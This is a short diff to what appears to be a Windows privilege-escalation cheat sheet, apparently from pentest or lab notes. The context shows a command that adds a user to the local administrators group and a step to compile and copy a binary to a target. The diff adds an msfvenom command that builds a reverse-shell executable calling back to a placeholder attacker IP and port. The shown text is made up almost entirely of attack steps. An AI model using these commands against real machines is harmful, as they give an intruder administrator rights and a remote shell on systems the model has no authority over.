@@ -14,7 +14,9 @@
 
     "cmd.exe /k net localgroup administrators USER /add"
     
-#### or a reverse shell payload.
+#### or a ready reverse shell payload.
+
+    msfvenom -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=ATTACKER_PORT -f exe > x.exe 
 
 #### 5: Compile with x86_64-w64-mingw32-gcc then copy to target.
 
